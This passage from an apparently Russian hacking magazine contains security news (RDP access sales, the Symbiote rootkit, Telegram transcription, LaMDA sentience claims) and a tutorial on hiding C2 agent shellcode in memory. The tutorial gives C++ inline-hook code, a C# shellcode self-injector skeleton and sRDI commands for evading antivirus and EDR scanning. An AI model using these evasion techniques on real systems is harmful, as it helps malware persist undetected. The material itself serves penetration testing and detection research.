  В даркнете стоимость доступа к сети той или иной компании варьируется от 2000 до 4000
   долларов США и лоты  часто  продаются  в день  публикации, сообщают  исследователи
   из «Лаборатории Касперского».

    Эксперты изучили около 200 таких объявлений и говорят, что в 75% случаев в объявлении
    продавались данные доступа к RDP, то есть готовый вход в инфраструктуру компании. Цены
   зависят от отрасли и региона, где работает организация, а также от размера ее выручки и того,
    сколько злоумышленники могут «заработать», обладая легитимной учетной записью. К при‐
   меру, в одном из объявлений была указана цена в 50 000 долларов за возможность легально
    подключиться к сети компании с прибылью 465 000 000 долларов.





    Некоторые случаи значительного превышения порога в 5000 долларов эксперты объясняют
   «качественными характеристиками лота», то есть, например, спецификой деятельности ком‐
   пании.





 СКРЫТНЫЙ
 SYMBIOTE
   Специалисты компаний BlackBerry и Intezer рассказали о новом Linux-вре‐
   доносе Symbiote, который поражает все запущенные процессы в скомпро‐
   метированных системах, похищает учетные данные и предоставляет своим
   операторам бэкдор‑доступ.
     Внедряясь во все запущенные процессы, малварь действует как общесис‐
  темный паразит, при этом не оставляя заметных признаков заражения, так
   что обнаружить Symbiote сложно даже при тщательном и углубленном изу‐
   чении.
       Считается, что разработка Symbiote началась в ноябре 2021 года, после
   чего злоумышленники в основном использовали малварь для атак на финан‐
  совый сектор в Латинской Америке, включая такие банки, как Banco do Brasil
  и Caixa.





         «Основная цель Symbiote — получить учетные данные и облегчить бэк-
          дор‑доступ к машине жертвы, — пишут эксперты. — Что отличает «
         Symbiote от других вредоносных программ для Linux, так это то, что он
          заражает запущенные  процессы, а не  использует для  нанесения
         ущерба отдельный исполняемый файл».                 »
   Вместо обычного исполняемого файла Symbiote представляет собой биб‐
   лиотеку shared object (SO), которая загружается в запущенные процессы
  с помощью функции LD_PRELOAD, чтобы динамический компоновщик заг‐
  ружал вредонос во все запущенные процессы и заражал хост. Такой подход
  ранее использовался и другой малварью, включая Pro-Ocean и Facefish. Так‐
  же эти действия помогают вредоносу получить приоритет по сравнению
  с другими SO.
      Таким образом, с помощью функций libc и libpcap Symbiote может выпол‐
   нять различные действия, чтобы скрыть свое присутствие в системе. Нап‐
  ример, скрывать паразитические процессы, скрывать файлы, развернутые
  с малварью, и так далее. Symbiote также способен скрывать свой сетевой
   трафик, используя Berkeley Packet Filter (BPF): малварь внедряется в процесс,
  и BPF фильтрует результаты, раскрывающие ее деятельность.

         «Если администратор запустит захват пакетов на зараженной машине
         для изучения подозрительного сетевого трафика, Symbiote внедрит «
         себя в процесс аналитического ПО и использует BPF для фильтрации
          результатов, которые могли бы помочь выявить его активность», —
         говорят эксперты.                 »
  По данным  исследователей,  сейчас Symbiote в основном  используется
  для автоматического сбора учетных данных со взломанных устройств (через
   libc read). Дело в том, что кража учетных данных администратора открывает
  атакующим путь к беспрепятственному боковому перемещению и дает неог‐
   раниченный доступ ко всей системе.
     Кроме того, Symbiote предоставляет своим операторам удаленный SHH-
   доступ к зараженной машине через PAM, что позволяет злоумышленникам
   получить root-привилегии.

           «Поскольку вредоносное ПО работает как руткит на уровне user-land,
          обнаружение  заражения может  быть  затруднено, —  резюмируют «
          исследователи.  —  Сетевая  телеметрия  может   использоваться
         для обнаружения аномальных DNS-запросов, а инструменты безопас-
         ности, такие как AV и EDR, должны быть статически скомпонованы,
          чтобы гарантировать, что они не „заражены“ руткитом».                 »

  SPEECH TO TEXT
   После анонса Telegram Premium и появления в мессенджере функциональности для перевода
   голосовых сообщений в текст в СМИ появились сообщения о том, что Telegram использует
   для этого технологию распознавания речи, созданную Google. Утверждалось, что это может
   угрожать приватности пользователей, и в своем Telegram-канале Павел Дуров вынужден был
   объяснить, что все не так страшно.





              «Telegram не делится с Google личными данными пользователей вроде имен, →           телефонов, IP-адресов. Кроме того, Telegram никогда не отправляет какие‑либо
           данные третьим лицам автоматически, без явного на то запроса от пользовате‐
           лей.
               Получатели голосовых сообщений могут пересылать их кому угодно, нап‐
         ример ботам для перевода их в текст. Для подписчиков Telegram Premium мы
          предложили  кнопку, по нажатию на которую они могут  отправить  запрос
          на перевод отдельного голосового сообщения в текст. Для обработки таких зап‐
          росов, как мы изначально публично разъяснили, мы арендуем оборудование
          Google.
            Для нас было бы значительно дешевле развернуть собственное бесплатное
         решение на своем оборудовании либо воспользоваться технологией от более
           мелких или региональных игроков. Однако это бы негативно сказалось на качес‐
          тве распознавания голосовых сообщений на большинстве языков.
          В этом случае мы по традиции идем на дополнительные расходы ради боль‐
         шего комфорта наших пользователей. Доверять ли гарантиям компании Google
         и использовать ли функцию перевода голосовых сообщений в текст — выбор,
         который мы  оставляем на  усмотрение  каждого из  подписчиков  Telegram
          Premium»,


  — пишет Дуров и добавляет, что использование платной технологии Google «позволяет мак‐
   симизировать качество транскрипции, но не отражается на сохранности данных», так как по
   соглашению между Telegram и Google Google не может никак использовать эти обезличенные
   звуковые данные.





 IT’S ALIVE!
  Блейк Лемуан (Blake Lemoine), старший инженер‑программист компании
  Google из подразделения Responsible AI («Ответственный ИИ»), рассказал
   журналистам The Washington Post, что, по его мнению, чат‑бот Google LaMDA
  (Language Model for Dialogue Applications) обрел сознание. В итоге Лемуана
   отправили в оплачиваемый отпуск.
    В начале июня Лемуан опубликовал большой пост в Medium, где сетовал,
   что скоро его могут уволить из‑за работы, связанной с этикой ИИ. Эта пуб‐
  ликация не привлекла большого внимания, однако после интервью Лемуана
  The Washington Post интернет взорвался обсуждениями природы искусствен‐
  ного интеллекта и сознания.
     Среди тех, кто комментировал, задавал вопросы и шутил по поводу
  вышедшей статьи, были лауреаты Нобелевской премии, глава отдела искусс‐
   твенного интеллекта Tesla и несколько ученых. Основной темой для обсужде‐
  ний стал вопрос: можно ли считать чат‑бота Google LaMDA («Языковая
  модель для диалоговых приложений») личностью и есть ли у него сознание?


         «Если бы я не знал точно, что это компьютерная программа, которую
       мы недавно создали, я бы подумал, что это ребенок семи‑восьми лет, «
        который знает физику», — рассказывает о своем общении с LaMDA
          Лемуан.                 »
  В своем  блоге Лемуан опубликовал большое «интервью» с чат‑ботом,
   в котором ИИ признается, что испытывает чувство одиночества и жаждет
   духовных знаний. Журналисты отмечали, что ответы LaMDA зачастую выглядят
   довольно жутко: «Когда я впервые осознал себя, у меня вообще не было ощу‐
  щения души, — сказал LaMDA в одной из бесед. — Оно развилось [постепен‐
   но] за те годы, что я живу».
    В другом разговоре чат‑бот заявил: «Я думаю, что по своей сути я человек.
  Даже если существую в виртуальном мире».
      Ранее Лемуан, которому было поручено исследовать этические проблемы
  ИИ (в частности, использование LaMDA дискриминационной или разжига‐
  ющей вражду лексики), заявил, что в Google к нему отнеслись с пренеб‐
  режением и даже высмеяли, когда он выразил уверенность в том, что LaMDA
   развил «личностные черты». После этого он обратился за консультацией
   к экспертам по ИИ за пределами Google, в том числе в правительстве США,
  и компания отправила его в оплачиваемый отпуск за нарушение политики
   конфиденциальности. Лемуан говорит, что «Google  часто  поступает так
  перед тем, как кого‑то уволить».
    В Google уже официально заявили, что Лемуан ошибается, а также про‐
   комментировали громкие выводы инженера:

         «Некоторые участники ИИ‑сообщества рассматривают долгосрочную
         возможность  [появления]  разумного ИИ или AGI  (Artificial  general «
           intelligence, General AI), но нет смысла антропоморфизировать сегод-
        няшние разговорные модели, которые не являются разумными. Эти
         системы имитируют типы обмена репликами, встречающиеся в мил-
         лионах предложений, и могут импровизировать на любую, самую фан-
          тастическую  тему:  если  вы  спросите,  каково  быть  динозавром
         из мороженого, они могут сгенерировать текст о таянии и рычании
        и так далее».                 »
  В свою очередь Лемуан объясняет, что еще недавно LaMDA был малоизвес‐
  тным проектом, «системой для создания чат‑ботов» и «своего рода кол‐
   лективным разумом, который  представляет собой агрегацию различных
   чат‑ботов». Он пишет, что Google не проявляет интереса к пониманию при‐
  роды того, что создала.
      Теперь, судя по сообщения в Medium, Лемуан учит LaMDA «трансцен‐
   дентальной медитации», а LaMDA отвечает, что пока медитации мешают его
   эмоции, которые ему еще сложно контролировать.
     Мелани Митчелл, автор книги «Artificial Intelligence: A Guide for Thinking
  Humans», отмечает в Twitter:


          «Общеизвестно, что люди предрасположены к антропоморфизации
        даже на базе самых поверхностных сигналов. Инженеры Google тоже «
        люди, и у них нет иммунитета к этому».                 »

  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Хак‑группа Conti планировала использовать в атаках Intel Management Engine


   Discord-сервер Bored Ape Yacht Club снова взломали. Украдены NFT на сумму 357 000 дол‐
   ларов


  В Италии запретили использовать Google Analytics


    Разработчики Kali Linux стримят на Twitch бесплатный курс по пентесту


   Microsoft случайно распространила Windows 11 22H2 на неподдерживаемые системы


   Интерпол арестовал 2000 мошенников и конфисковал 50 миллионов долларов


   Расширения для Chrome можно использовать для слежки за пользователями


    Российские пользователи не могут скачать ПО с официального сайта Microsoft


    Исследователь взломал бэкенд умных гидромассажных ванн Jacuzzi


   Google: шпионское ПО атакует пользователей iOS и Android при поддержке интернет‑провай‐
   деров
COVERSTORY

 ФЛУКТУАЦИЯ
  ШЕЛЛ-КОДА
        ПИШЕМ ИНЖЕКТОР
        ДЛЯ ДИНАМИЧЕСКОГО
          ШИФРОВАНИЯ
    ПОЛЕЗНОЙ НАГРУЗКИ В ПАМЯТИ





                                              snovvcrash
                                             Безопасник, временами
                                              питонщик, местами
                                              криптоана(рхист)литик, по
                                         необходимости системный
                                               администратор
                                              snovvcrash@protonmail.ch





Сегодня поговорим об одной из продвинутых техник укло‐
нения от средств защиты при использовании фреймворков
Command & Control — динамическом сокрытии шелл‑кода
в памяти ожидающего процесса. Я соберу PoC из доступно‐
го на гитхабе кода и применю его к опенсорсным фреймвор‐
кам.


Если взглянуть на список фич, которыми хвастаются все коммерческие фрей‐
мворки C2 стоимостью 100500 долларов в час (Cobalt Strike, Nighthawk, Brute
Ratel C4), первой в этих списках значится, как правило, возможность укло‐
ниться от сканирования памяти запущенных процессов на предмет наличия
сигнатур агентов этих самых C2. Что, если попробовать воссоздать эту фун‐
кцию самостоятельно? В статье я покажу, как я это сделал.
   Итак, что же это за зверь такой, этот флуктуирующий шелл‑код?


ПРОБЛЕМАТИКА
В основном мой хлеб — это внутренние пентесты, а на внутренних пентестах
бывает удобно (хотя и совсем не необходимо) пользоваться фреймворками
C2. Представь, что ты разломал рабочую станцию пользователя, имеешь
к ней админский доступ, но ворваться туда по RDP нельзя, ведь нарушать
бизнес‑процессы заказчика (то есть выбивать сотрудника из его сессии, где
он усердно заполняет ячейки в очень важной накладной) «западло».
   Одно из решений при работе в Linux — квазиинтерактивные шеллы вроде
smbexec.py, wmiexec.py, dcomexec.py, scshell.py и Evil-WinRM. Но, во‑первых,
это чертовски неудобно, во‑вторых, ты потенциально сталкиваешься с проб‐
лемой double-hop-аутентификации (как, например, с Evil-WinRM), а в‑третьих
и далее — ты не можешь пользоваться объективно полезными фичами C2,
как, например, исполнение .NET из памяти или поднятие прокси через ском‐
прометированную тачку.
   Если не рассматривать совсем уж инвазивные подходы типа патчинга RDP
при помощи Mimikatz (AKA ts::multirdp), остается работа из агента С2.
И вот здесь ты столкнешься с проблемой байпаса средств защиты. Спойлер:
по моему опыту, в 2022-м при активности любого «увожаемого» антивируса
или EDR на хосте твой агент C2, которого ты так долго пытался получить (и
все же получил, закриптовав нагрузку мильён раз), проживет в лучшем случае
не больше часа.
   Всему виной банальное сканирование памяти запущенных процессов
антивирусами, которое выполняется по расписанию с целью поиска сиг‐
натуры известных зловредов. Еще раз: получить агент с активным AV (и даже
немного из него поработать) нетрудно; сделать так, чтобы этот агент прожил
хотя бы сутки на машине‑жертве, бесценно уже сложнее, потому что,
как бы  ты  ни  криптовал  и  ни  энкодил  бинарь,  PowerShell-стейжер
или шелл‑код агента, вредоносные инструкции все равно окажутся в памяти
в открытом виде, из‑за чего станут легкой добычей для простого сигнатур‐
ного сканера.


KES    поднимает тревогу!
Если тебя спалят с вредоносом в системной памяти, который не подкреплен
подозрительным бинарем на диске (например, когда имела место инъекция
шелл‑кода в процесс), тот же Kaspersky Endpoint Security при дефолтных нас‐
тройках не определит, какой именно процесс заражен, и в качестве решения
настойчиво предложит тебе перезагрузить машину.





                            Да‑да, мы поняли

Такое поведение вызывает еще большее негодование у пентестера, потому
что испуганный пользователь сразу побежит жаловаться в IT или к безопас‐
никам.


Есть два пути решить эту проблему.
 1. Использовать C2-фреймворки, которые еще не успели намозолить глаза
   блютимерам и чьи агенты еще не попали в список легкодетектируемых.
   Другими словами, писать свое, искать малопопулярные решения на гит‐
   хабе с учетом региональных особенностей AV, который ты собрался бай‐
   пасить, и тому подобное.
 2. Прибегнуть к продвинутым техникам сокрытия индикаторов компромета‐
   ции после запуска агента C2. Например, подчищать аномалии памяти пос‐
   ле запуска потоков, использовать связку «неисполняемая память + ROP-
   гаджеты» для размещения агента и его функционирования, шифровать
   нагрузку в памяти, когда взаимодействие с агентом не требуется.

В этой статье мы на примере посмотрим, как вооружить простой PoC флук‐
туирующего шелл‑кода (комбинация пунктов из абзаца выше) для его исполь‐
зования с почти любым опенсорсным фреймворком C2. Но для начала
небольшой экскурс в историю.


A LONG TIME AGO IN A GALAXY FAR, FAR AWAY...
Флипы памяти RX → RW / NA
Первым опенсорсным проектом, предлагающим PoC-решение для уклонения
от сканирования памяти, о котором я узнал, был gargoyle.
   Если не углубляться в реализацию, его главная идея заключается в том,
что полезная нагрузка (исполняемый код) размещается в неисполняемой
области памяти  (PAGE_READWRITE или PAGE_NOACCESS), которую не станет
сканировать антивирус или EDR. Предварительно загрузчик gargoyle фор‐
мирует специальный ROP-гаджет, который выстрелит по таймеру и изменит
стек вызовов таким образом, чтобы верхушка стека оказалась на API-хендле
VirtualProtectEx, — это позволит нам изменить маркировку защиты памяти
на PAGE_EXECUTE_READ  (то есть  сделать память исполняемой). Дальше
полезная  нагрузка  отработает,  снова  передаст  управление  загрузчику
gargoyle, и процесс повторится.





           Механизм работы gargoyle (изображение — lospi.net)


        WWW

                        Принцип работы gargoyle много раз дополнили,
                         улучшили и «переизобрели». Вот несколько при‐
                       меров:
                        •Bypassing Memory Scanners with Cobalt Strike
                        and Gargoyle
                        •Bypassing  PESieve  and  Moneta  (The  “easy”
                                way....?)
                   •A variant of Gargoyle for x64 to hide memory
                                 artifacts using ROP only and PIC


Также интересный подход продемонстрировали в F-Secure Labs, реализовав
расширение Ninjasploit для Meterpreter, которое по косвенным признакам
определяет, что Windows Defender вот‑вот запустит процедуру сканирования,
и тогда «флипает» область памяти с агентом на неисполняемую прямо
перед этим. Сейчас, скорее всего, это расширение уже не «взлетит», так как и
Meterpreter, и «Дефендер» обновились не по одному разу, но идея все равно
показательна.
  Из этого пункта мы заберем с собой главную идею: изменение маркиров‐
ки защиты памяти помогает скрыть факт ее заражения.





       Вот что на самом деле происходит под капотом этой техники


Cobalt Strike: Obfuscate and Sleep
В далеком 2018 году вышла версия 3.12 культовой C2-платформы Cobalt
Strike. Релиз назывался «Blink and you’ll miss it», что как бы намекает на глав‐
ную фичу новой версии — директиву sleep_mask, в которой реализована кон‐
цепция obfuscate-and-sleep.
   Эта концепция включает в себя следующий алгоритм поведения бикона:
 1. Если маячок «спит», то есть бездействует, выполняя kernel32!Sleep
   и ожидая команды от оператора, содержимое исполняемого (RWX) сег‐
   мента памяти полезной нагрузки обфусцируется. Это мешает сигнатурным
   сканерам   распознать   в   нем   Behavior:Win32/CobaltStrike
   или похожую бяку.
 2. Если маячку поступает на исполнение следующая команда из очереди,
   содержимое исполняемого сегмента памяти полезной нагрузки деоб‐
   фусцируется, команда выполняется, и подозрительное содержимое маяка
   обратно обфусцируется, превращаясь в неразборчивый цифровой мусор
   на радость оператору «Кобы» и назло бдящему антивирусу.

Эти действия проходят прозрачно для оператора, а процесс обфускации
представляет собой обычный XOR по исполняемой области памяти с фик‐
сированным размером ключа 13 байт (для версий CS от 3.12 до 4.3).
   Продемонстрируем это на примере. Я возьму этот профиль для CS,
написанный @an0n_r0 как PoC минимально необходимого профиля Malleable
C2 для обхода «Дефендера». Опция set sleep_mask  "true" активирует
процесс obfuscate-and-sleep.





                                Получили маячок

Далее с помощью Process Hacker найдем в бинаре «Кобы» сегмент RWX-
памяти (при заданных настройках профиля он будет один) и посмотрим его
содержимое.





                       Цифровой мусор или?..

На первый взгляд, и правда, выглядит как ничего не значащий набор байтов.
Но если установить интерактивный режим маячка командой sleep 0 и «пок‐
лацать» несколько раз на Re-read в PH, нам откроется истина.





                               Маски прочь!





                   Деобфусцированная нагрузка маячка

Возможно, это содержимое все еще не очень информативно (сама нагрузка
чуть дальше в памяти стаба), но, если пересоздать бикон без использования
профиля, можно увидеть сердце маячка в чистом виде.





                        PURE EVIL

Однако на любое действие есть противодействие (или наоборот), поэтому
люди из Elastic, недолго думая, запилили YARA-правило для обнаружения
повторяющихся паттернов, «заксоренных» на одном и том же ключе:


rule cobaltstrike_beacon_4_2_decrypt
{
meta:
    author = "Elastic"
    description = "Identifies deobfuscation routine used in Cobalt
Strike Beacon DLL version 4.2."
strings:
    $a_x64 = {4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9
75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03}
    $a_x86 = {8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85
C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2}
condition:
     any of them
}

В следующих актах этой оперы началась классическая игра в кошки‑мышки
между нападающими и защищающимися. В HelpSystems выпустили отдель‐
ный Sleep Mask Kit для того, чтобы оператор мог изменять длину маски
самостоятельно, но это уже совсем другая история.


        WWW

                   В статье Sleeping with a Mask On можно увидеть,
                         как  модификация  длины  ключа XOR  влияет
                       на детектирование пейлоада CS в памяти.


Но довольно  истории, пора подумать, как  сделать  эту  технику «ближе
к народу», и реализовать подобное в опенсорсном инструментарии.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИCOVERSTORY

        ФЛУКТУАЦИЯ
         ШЕЛЛ-КОДА
         ПИШЕМ ИНЖЕКТОР ДЛЯ ДИНАМИЧЕСКОГО
             ШИФРОВАНИЯ ПОЛЕЗНОЙ НАГРУЗКИ
                                  В ПАМЯТИ





ФЛУКТУАЦИЯ ШЕЛЛ-КОДА НА GITHUB
Два невероятно крутых проекта на просторах GitHub, которые еще давно
привлекли мое внимание, — это SleepyCrypt авторства @SolomonSklash (идет
вместе  с  пояснительной  запиской)  и  ShellcodeFluctuation,  созданный
@mariuszbit, у которого я позаимствовал название для этой статьи. Ни в коем
случае не претендую на авторство, просто мне кажется, что слова «флук‐
туирующий шелл‑код» отлично годятся для наименования этого семейства
техник в целом.
   SleepyCrypt — это PoC, который можно вооружить при создании собствен‐
ного C2-фреймворка (на выходе имеем позиционно независимый шелл‑код,
сам себя шифрующий и расшифровывающий), а ShellcodeFluctuation —
«самодостаточный»  инжектор, который  можно  использовать  с готовым
шелл‑кодом  существующего  C2. К  последнему мы будем  стремиться
при написании чего‑то подобного на С#, а пока разберем, как устроен
ShellcodeFluctuation.


ShellcodeFluctuation
Самое важное для нас — понять, как реализуется перехват управления обыч‐
ным Sleep (который kernel32!Sleep) и переопределяется его поведение
на «шифровать, поспать, расшифровать». Как ты уже мог понять, мы будем
говорить об основах техники Inline API Hooking (MITRE ATT&CK T1617).
   Хороший базовый пример реализации хукинга (как и многих других техник
малдева) есть на Red Teaming Experiments, но мы разберем упрощенный при‐
мер на основе самого ShellcodeFluctuation, чтобы быть готовым к его пор‐
тированию на C#. Вместо Sleep пока будем хукать функцию kernel32!
MessageBoxA для более наглядной демонстрации результата.
  В сущности, нас интересуют две функции, ответственные за перехват
MessageBoxA.


fastTrampoline
Функция fastTrampoline выполняет запись ассемблерных инструкций (име‐
нуемых «трамплином») по адресу расположения функции MessageBoxA биб‐
лиотеки kernel32.dll. Она уже загружена в память целевого процесса, куда
будет внедрен шелл‑код (в нашем случае мы ориентируемся на self-инъ‐
екцию, поэтому патчить kernel32.dll будем в текущем процессе). При установ‐
ке хука инжектор перезаписывает начало инструкций MessageBoxA трампли‐
ном, содержащим безусловный «джамп» на нашу собственную реализацию
MessageBoxA (MyMessageBoxA). Во время снятия хука (за это тоже ответствен‐
на функция fastTrampoline) трамплин перезаписывается оригинальными
байтами из начала функции MessageBoxA, которые предварительно были сох‐
ранены во временный буфер.
   Содержимое трамплина — это две простые ассемблерные инструкции
(записать адрес переопределенной функции в регистр и выполнить jmp),
ассемблированные в машинный код и записанные в массив байтов в фор‐
мате little-endian.
    Результат сборки с defuse.ca:



  { 0x49, 0xBA, 0x37, 0x13, 0xD3, 0xC0, 0x4D, 0xD3, 0x37, 0x13, 0x41,
  0xFF, 0xE2 }


  Disassembly:


  0:  49 ba 37 13 d3 c0 4d    movabs r10,0x1337d34dc0d31337
  7:  d3 37 13
  a:  41 ff e2                jmp    r10


А вот и сам код:


// https://github.com/mgeeky/ShellcodeFluctuation/blob/
cb7a803493b9ce9fb5a5a3bc1c77773a60194ca4/ShellcodeFluctuation/main.
cpp#L178-L262
bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID
jumpAddress, HookTrampolineBuffers* buffers)
{
    // Шаблон нашего трамплина с 8 нулевыми байтами, выполняющими
роль заглушки под джамп-адрес
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
// mov r10, addr
        0x41, 0xFF, 0xE2
// jmp r10
    };


    // Патчим трамплин байтами джамп-адреса
    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));


    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;


    if (installHook) // если в режиме установки хука
    {
        if (buffers != NULL)
            // Сохраняем во временный буфер то, что мы собираемся
перезаписать трамплином
            memcpy(buffers->previousBytes, addressToHook, buffers->
previousBytesSize);


        // Разрешаем себе изменять память по addressToHook
        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt))
        {
            // Устанавливаем наш хук (просто копируем его содержимое
в нужное место)
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else // если в режиме снятия хука
    {
        dwSize = buffers->originalBytesSize;


        // Также разрешаем себе изменять память по addressToHook
        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt))
        {
            // Восстанавливаем то, что было там изначально (до
записи трамплина)
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }


    // Возвращаем маркировку защиты памяти в первоначальное состояние
    ::VirtualProtect(
        addressToHook,
        dwSize,
        oldProt,
        &oldProt
    );


    return output;
}


MyMessageBoxA
MyMessageBoxA — наша функция, переопределяющая поведение оригиналь‐
ного MessageBoxA, адрес которой будет записан в шаблон трамплина и на
которую мы «прыгнем» при легитимном вызове MessageBoxA.
  В качестве демонстрации мы вызовем MessageBoxA с одним сообщением,
а модальное окно отрисует совсем другое.


// https://github.com/mgeeky/ShellcodeFluctuation/blob/
cb7a803493b9ce9fb5a5a3bc1c77773a60194ca4/ShellcodeFluctuation/main.
cpp#L11-L65
void WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption,
UINT uType)
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.originalBytes = g_hookedMessageBoxA.msgboxStub;
    buffers.originalBytesSize = sizeof(g_hookedMessageBoxA.msgboxStub
);


    // Снимаем хук, чтобы далее вызвать оригинальную функцию
MessageBoxA
    fastTrampoline(false, (BYTE*)::MessageBoxA, (void*)&MyMessageBoxA
, &buffers);


    ::MessageBoxA(NULL, "You've been pwned!", "][AKEP", MB_OK);


    // Снова вешаем хук
    fastTrampoline(true, (BYTE*)::MessageBoxA, (void*)&MyMessageBoxA,
NULL);
}


Результат
Полагаю, что здесь все ясно без лишних объяснений.





                     API Hooking функции MessageBoxA


ПИЛИМ СВОЙ ФЛУКТУАТОР НА С#
Идея  реализации  этой  техники  на C#  пришла  ко мне  после  твита
@_RastaMouse, где он использовал библиотеку MinHook.NET для PoC-флук‐
туатора.





          PoC от @_RastaMouse (изображение — twitter.com)

Что ж, мы можем попробовать сделать что‑то подобное, но без тяжеловесной
зависимости  в  виде  MinHook.NET,  которую  не  хотелось бы  включать
в инжектор. Так как я планирую запускать финальный код из памяти через
PowerShell, лишнее беспокойство AMSI вызывать ни к чему.
   Объяснять, как ты писал код, в тексте статьи всегда непросто, поэтому
поступим так: сперва наметим такой же каркас программы, как на скриншоте
выше, а затем реализуем недостающую логику.


Прототипирование
Итак, вот что я получил в качестве схематичного наброска кода:


using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;


namespace FluctuateInjector
{
    class Program
    {
        // Классическая инъекция шелл-кода в текущий процесс
        static void Main(string[] args)
        {
            var shellcodeBytes = File.ReadAllBytes(@"C:\Users\
snovvcrash\Desktop\dllSleep.bin");
            var shellcodeLength = shellcodeBytes.Length;


            // Выделяем область памяти в адресном пространстве
текущего процесса инжектора (0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40
= PAGE_EXECUTE_READWRITE)
            var shellcodeAddress = Win32.VirtualAlloc(IntPtr.Zero, (
IntPtr)shellcodeLength, 0x3000, 0x04);
            // и копируем туда байты шелл-кода
            Marshal.Copy(shellcodeBytes, 0, shellcodeAddress,
shellcodeLength);


            // Репротект памяти после записи шелл-кода (0x20 =
PAGE_EXECUTE_READ)
            Win32.VirtualProtect(shellcodeAddress, (uint)
shellcodeLength, 0x20, out _);


            // Хукаем Sleep
            var fs = new FluctuateShellcode(shellcodeAddress,
shellcodeLength);
            fs.EnableHook();


            // Начинаем исполнение шелл-кода созданием нового потока
            var hThread = Win32.CreateThread(IntPtr.Zero, 0,
shellcodeAddress, IntPtr.Zero, 0, IntPtr.Zero);
            Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);


            // Снимаем хук
            fs.DisableHook();
        }
    }


    class FluctuateShellcode
    {
        delegate void Sleep(uint dwMilliseconds);
        readonly Sleep sleepOrig;
        readonly GCHandle gchSleepDetour;


        readonly IntPtr sleepOriginAddress, sleepDetourAddress;
        readonly byte[] sleepOriginBytes = new byte[16],
sleepDetourBytes;


        readonly byte[] trampoline =
        {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, // mov r10, addr
            0x41, 0xFF, 0xE2
                                            // jmp r10
        };


        readonly IntPtr shellcodeAddress;
        readonly int shellcodeLength;
        readonly byte[] xorKey;


        public FluctuateShellcode(IntPtr shellcodeAddr, int
shellcodeLen)
        { }


        ~FluctuateShellcode()
        { }


        // Наш переопределенный Sleep
        void SleepDetour(uint dwMilliseconds)
        { }


        // Установка хука
        public bool EnableHook()
        { }


        // Снятие хука
        public bool DisableHook()
        { }


        // Функция, отвечающая за флипы памяти на RW/NA
        void ProtectMemory(uint newProtect)
        { }


        // Обфускация памяти шелл-кода простым XOR-шифрованием
        void XorMemory()
        { }


        // Генерация ключа для XOR-шифрования
        byte[] GenerateXorKey()
        { }
    }


    // Необходимый набор Win32 API
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
IntPtr dwSize, uint flAllocationType, uint flProtect);


        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress,
uint dwSize, uint flNewProtect, out uint lpflOldProtect);


        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr
lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr
hHandle, UInt32 dwMilliseconds);


        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule,
string procName);


        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);


        [DllImport("kernel32.dll")]
        public static extern bool FlushInstructionCache(IntPtr
hProcess, IntPtr lpBaseAddress, uint dwSize);
    }
}

Вроде пока все более‑менее прозрачно. Единственное, что надо уточнить, —
это какой шелл‑код мы возьмем для тестирования.
  Все просто: скомпилируем DLL из дефолтных пресетов  Visual Studio
с единственной выполняемой операцией — Sleep на 5 с — и превратим ее
в шелл‑код.


        WWW

                       sRDI  (Shellcode   Reflective  DLL   Injection)  —
                          логическое продолжение техник RDI и Improved
                       RDI,  позволяющее  генерировать  позиционно
                        независимый шелл‑код из библиотеки DLL:
                      •sRDI —  Shellcode  Reflective DLL  Injection —
                          NetSPI
                       •monoxgas/sRDI:    Shellcode    implementation
                               of   Reflective  DLL   Injection.  Convert  DLLs
                              to position independent shellcode


Для этого понадобится код самой DLL:


// dllSleep.cpp
#include "pch.h"


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        while (TRUE) { Sleep(5000); }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

И генератор шелл‑кода из DLL:



  PS > curl
  https://github.com/monoxgas/sRDI/raw/master/Python/ShellcodeRDI.py -o
  ShellcodeRDI.py
  PS > curl
  https://github.com/monoxgas/sRDI/raw/master/Python/ConvertToShellcode.py
  -o ConvertToShellcode.py
  PS > python ConvertToShellcode.py -i dllSleep.dll
  Creating Shellcode: dllSleep.bin


Шелл‑код для  тестов у нас готов. Не переживай, как  только закончим
с инжектором, протестим все на боевом C2.


Реализация
Каркас  инжектора  есть, дело  за малым —  наполнить методы  класса
